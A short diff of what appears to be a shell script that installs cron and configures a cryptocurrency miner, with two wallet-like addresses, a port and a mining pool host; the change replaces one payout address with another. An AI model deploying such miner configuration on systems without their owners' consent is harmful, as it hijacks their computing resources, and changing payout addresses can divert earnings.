@@ -8,7 +8,7 @@ sudo ldconfig
 apt install cron -y
 apt install nano -y
 service cron start
-id1=87CdGvxKktVNebisEHVzNwCjPeS54wrPkBAMuGViHNDMjWBU4hwoubRLagcxFEUo2K5kcJ4QSVanEPag9UDr4s9bQSYQ4hz
+id1=4B4it77b2U5ed3spCMtxEd8nrDuAdPqS8H3BkDaVyPkQMaQmJq2zkvva5T9K9zbv37GU169fM2UmAWCdgaMfttQbR9oRQ27
 id2=125fka2fSVTvhv6dSTzMWQNN3ZBLWZNQLneH8BKqLH8aYUANvVFtLWL7457cQnCfMvXuSizBaH5k5b6DnmupCiPdjjG
 port=64520
 pool1=ala168.cn:431
